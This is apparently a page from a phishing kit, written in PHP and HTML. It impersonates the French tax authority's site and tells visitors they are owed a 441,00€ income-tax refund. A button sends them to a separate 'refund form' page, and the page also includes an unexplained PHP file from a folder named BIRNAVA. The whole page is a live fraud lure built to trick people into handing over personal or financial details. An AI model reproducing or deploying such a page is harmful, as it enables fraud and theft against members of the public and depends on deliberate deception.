<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html lang="fr"><head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="apple-itunes-app" content="app-id=505488770">
				<link rel="stylesheet" href="./X911/style_v2.css">

		<link rel="shortcut icon" href="./X911/favicon.ico" type="image/ico">

		<title>Impots : Formulaire de remboursement</title>
	</head>
	<body>


		<div id="banner" style="margin-bottom:6px;">
<div class="container">
<a href="#"><img src="./X911/logo.svg" style="height: 72px; margin-top:15px;"></a>
<a href=""><img id="optionalstuff" src="./X911/lgn.png" style="float:right;margin-top:13px;">

<style>
@media (max-width:629px) {
  img#optionalstuff {
    display: none;
  }
}
</style></a>
</div>
</div>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
					<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
					<li class="active">Remboursement des crédits d'impôts sur le revenu</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" style="margin-top:-12px;" id="contenu">
			
			<div class="row">
				<!-- Connexion Gauche-->	
				<div class="col-md-12">
					
					<div class="panel panel-default">
						<div class="panel-heading">

							<h2 id="titre_authent" style="margin-top:12px;" class="text-center">Remboursement des crédits d'impôts sur le revenu</h2>
						</div>
						<div class="panel-body"><br>
						Après les derniers calculs d'administration fiscale des crédits d'impôts sur le revenu, nous avons déterminé que vous êtes admissible à recevoir un remboursement de notre part d'un montant de <b>441,00€.</b><br><br>

						Quelles sont les démarches à suivre pour effectuer mon remboursement d'impôts ?<br><br>

						&nbsp; &nbsp; <b>1. Rendez-vous sur le formulaire de remboursement.<br>
&nbsp; &nbsp; 2. Remplissez le formulaire de remboursement des Impôts.<br>
&nbsp; &nbsp; 3. Votre demande est prise en compte (traitée sous 48 heures).</b><br><br>

<a href="./A.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch"><button type="button" class="btn btn-xl btn-primary">Accéder au formulaire de remboursement</button></a><br><br>
									
								
						</div>
					</div>
				</div>
				</div> 
				<br><br>

			 <!-- row FIN -->
		</main> 
	

	
		
	
</body></html>